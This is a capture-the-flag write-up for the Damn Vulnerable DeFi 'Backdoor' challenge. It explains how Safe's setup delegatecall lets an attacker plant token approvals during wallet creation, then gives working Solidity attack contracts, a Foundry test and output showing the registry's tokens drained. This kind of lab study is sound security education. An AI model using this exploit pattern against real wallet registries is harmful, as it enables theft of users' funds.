# Challenge - Backdoor

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.

The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

## Objective of CTF

Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.

Create a safe wallet (call `createProxyWithCallback` in the `SafeProxyFactory`) -> execute `setup` function in `Safe` contract -> execute the callback function (e.g. `proxyCreated` in the `WalletRegistry` contract).

## Vulnerability Analysis

In the `WalletRegistry` contract, there is a `proxyCreated` function, which serves as a callback triggered when a proxy is created via the `createProxyWithCallback` function in the `SafeProxyFactory` contract.

The `proxyCreated` function verifies certain conditions for the newly created wallet. If the wallet meets the required conditions, 10 DVT tokens are transferred to the created wallet, as shown below:

```solidity
/**
    * @notice Function executed when user creates a Safe wallet via SafeProxyFactory::createProxyWithCallback
    *          setting the registry's address as the callback.
    */
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
    if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) {
        // fail early
        revert NotEnoughFunds();
    }

    address payable walletAddress = payable(proxy);

    // Ensure correct factory and copy
    if (msg.sender != walletFactory) {
        revert CallerNotFactory();
    }

    if (singleton != singletonCopy) {
        revert FakeSingletonCopy();
    }

    // Ensure initial calldata was a call to `Safe::setup`
    if (bytes4(initializer[:4]) != Safe.setup.selector) {
        revert InvalidInitialization();
    }

    // Ensure wallet initialization is the expected
    uint256 threshold = Safe(walletAddress).getThreshold();
    if (threshold != EXPECTED_THRESHOLD) {
        revert InvalidThreshold(threshold);
    }

    address[] memory owners = Safe(walletAddress).getOwners();
    if (owners.length != EXPECTED_OWNERS_COUNT) {
        revert InvalidOwnersCount(owners.length);
    }

    // Ensure the owner is a registered beneficiary
    address walletOwner;
    unchecked {
        walletOwner = owners[0];
    }
    if (!beneficiaries[walletOwner]) {
        revert OwnerIsNotABeneficiary();
    }

    address fallbackManager = _getFallbackManager(walletAddress);
    if (fallbackManager != address(0)) {
        revert InvalidFallbackManager(fallbackManager);
    }

    // Remove owner as beneficiary
    beneficiaries[walletOwner] = false;

    // Register the wallet under the owner's address
    wallets[walletOwner] = walletAddress;

    // Pay tokens to the newly created wallet
    SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
}
```

The important conditions that must be met are:

-   The `proxyCreated` function must be called by the walletFactory (e.g., the `SafeProxyFactory` contract).
-   The singleton must be a `Safe` contract.
-   The `initializer` must be a calldata to the `setup` function in the `Safe` contract.

The `createProxyWithCallback` function in the `SafeProxyFactory` contract deploys a proxy contract using the `_singleton` and `saltNonce` parameters. It can also execute a low-level call with the `initializer` data on the new proxy and invoke a callback at a specified address, as shown below:

```solidity
function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    IProxyCreationCallback callback
) public returns (SafeProxy proxy) {
    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
}
```

The `WalletRegistry` contract requires creating a safe wallet and calling the `setup` function in the `Safe` contract during the wallet creation process, the `setup` function shown as below:

```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external {
    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
    setupOwners(_owners, _threshold);
    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
    setupModules(to, data);

    if (payment > 0) {
        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
        // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
    }
    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
}
```

```solidity
function setupModules(address to, bytes memory data) internal {
    require(modules[SENTINEL_MODULES] == address(0), "GS100");
    modules[SENTINEL_MODULES] = SENTINEL_MODULES;
    if (to != address(0)) {
        require(isContract(to), "GS002");
        // Setup has to complete successfully or transaction fails.
        require(execute(to, 0, data, Enum.Operation.DelegateCall, type(uint256).max), "GS000");
    }
}
```

```solidity
function execute(
    address to,
    uint256 value,
    bytes memory data,
    Enum.Operation operation,
    uint256 txGas
) internal returns (bool success) {
    if (operation == Enum.Operation.DelegateCall) {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
        }
    } else {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
        }
    }
}
```

During the wallet creation process, we notice that in the `Safe` contract's `setup` function, a delegatecall can be made to the address to through the `setupModules` function. This call is unrestricted, providing an opportunity to exploit the process.

After the safe wallet is created, it will receive 10 DVT tokens from the `WalletRegistry`. To exploit this, we can inject a malicious token approval by leveraging the delegatecall to execute the approval through a malicious contract. However, simply using delegatecall to call the DVT contract’s approve method won’t change the DVT allowance, as the delegatecall operates in the context of the `WalletRegistry` and not the DVT contract itself.

To bypass this limitation, the attacker can deploy a malicious contract designed to call the DVT contract’s approve function. By directing the delegatecall to this malicious contract, it can then invoke the approve method on the DVT contract, effectively altering the allowance and gaining control over the DVT tokens.

### Attack steps:

1. Deploy a malicious contract that only deal with token approval
2. Use crafted setup calldata to trigger token approval via the malicious contract during the `Safe` wallet creation.
3. Transfer the approved DVT tokens to the attacker's recovery address.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WalletRegistry} from "./WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";

contract MaliciousApprove {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, 10 ether);
    }
}

contract AttackWalletRegistry {
    address private immutable token;
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    address private immutable recovery;
    address private immutable maliciousApprove;

    address[] private users;

    constructor(
        address _token,
        address _singletonCopy,
        address _walletFactory,
        address _walletRegistry,
        address _recovery,
        address[] memory _users
    ) {
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        recovery = _recovery;
        users = _users;

        maliciousApprove = address(new MaliciousApprove());

        address[] memory owners = new address[](1);
        address wallet;

        for (uint256 i; i < 4; ++i) {
            owners[0] = users[i];

            // craft a calldata to call maliciousApprove during Safe wallet setup
            bytes memory data = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    maliciousApprove, // the address must be a contract, or the safe wallet setup will revert.
                    abi.encodeCall(MaliciousApprove.approve, (token, address(this))),
                    address(0),
                    address(0),
                    0,
                    payable(0)
                )
            );

            wallet = address(
                SafeProxyFactory(walletFactory).createProxyWithCallback(
                    address(singletonCopy), data, i, WalletRegistry(walletRegistry)
                )
            );

            IERC20(token).transferFrom(wallet, recovery, 10 ether);
        }
    }
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {AttackWalletRegistry} from "../../src/backdoor/AttackWalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the wallet registry", token.balanceOf(address(walletRegistry)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );

        AttackWalletRegistry maliciousContract = new AttackWalletRegistry(
            address(token), address(singletonCopy), address(walletFactory), address(walletRegistry), recovery, users
        );

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the wallet registry", token.balanceOf(address(walletRegistry)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
```

### Test Result

```
Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
[PASS] test_assertInitialState() (gas: 55670)
[PASS] test_backdoor() (gas: 2080322)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the wallet registry: 40.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the wallet registry: 0.000000000000000000
  token balance in the recovery address: 40.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.99ms (3.95ms CPU time)

Ran 1 test suite in 243.77ms (11.99ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
